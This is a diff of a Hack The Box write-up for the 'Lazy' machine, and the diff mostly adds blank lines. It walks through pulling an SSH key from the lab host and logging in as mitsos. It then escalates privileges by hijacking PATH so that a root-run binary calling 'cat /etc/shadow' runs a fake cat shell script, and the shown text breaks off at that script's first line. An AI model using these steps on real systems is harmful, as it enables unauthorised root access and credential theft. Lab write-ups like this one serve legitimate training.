@@ -24,13 +24,17 @@ Website directs us to devcompany's page
 **To start, you will need to create a user register and then log in to check this company's projects and potential.**
 
 Tried some basic SQL Injections on the login page but nada.
+
 So, lets create a testuser
+
 ![Alt test](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Lazy/images/testuserlogin.PNG "testuserlogin")
 
 
 
 After creating a user, there is something peculiar
+
 Once the user is registered, it automatically logs us in as that user.
+
 Lets try and create a user with the name admin
 
 ![Alt test](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Lazy/images/adminalreadyexists.PNG "adminalreadyexists")
@@ -56,8 +60,11 @@ There is a ssh key which we can download
 ![Alt test](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Lazy/images/sshkey.PNG "sshkey")
 
 Something important to note in the key page is the highlighted field. Thats the user the key is for
+
 So we save the key in a file called mistos.key
+
 Change its permissions to 600
+
 ```
 root@kali:~/Hackthebox/Machines/Lazy# wget http://10.10.10.18/mysshkeywithnamemitsos
 --2017-10-15 11:36:53--  http://10.10.10.18/mysshkeywithnamemitsos
@@ -75,6 +82,7 @@ root@kali:~/Hackthebox/Machines/Lazy# chmod 600 mitsos.key
 ```
 
 And we connect to mitsos
+
 ```
 root@kali:~/Hackthebox/Machines/Lazy# ssh -i mitsos.key mitsos@10.10.10.18
 Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
@@ -113,6 +121,7 @@ drwxrwxr-x 4 mitsos mitsos 4096 May  2 18:41 peda
 ```
 
 There is a executable named backup
+
 When we try and run it, it gives something like this
 ```
 mitsos@LazyClown:~$ ./backup 
@@ -164,6 +173,7 @@ cat /etc/shadow
 ```
 
 So its a simple exec which runs the command "cat /etc/shadow" and it is run by root
+
 This is perfect for priv esc!
 
 Our path contains
@@ -173,6 +183,7 @@ mitsos@LazyClown:~$ echo $PATH
 ```
 
 What we can do is create a executable with the name cat in our home directory and add the our home directory to our $PATH
+
 Lets start by addint the $PATH first
 ```
 mitsos@LazyClown:~$ export PATH="/home/mitsos:$PATH"
@@ -181,7 +192,9 @@ mitsos@LazyClown:~$ echo $PATH
 ```
 
 Now we need to create a cat executable.
+
 We can create a bash script which will spawn a bash shell
+
 Something as simple as
 ```
 #!/bin/sh
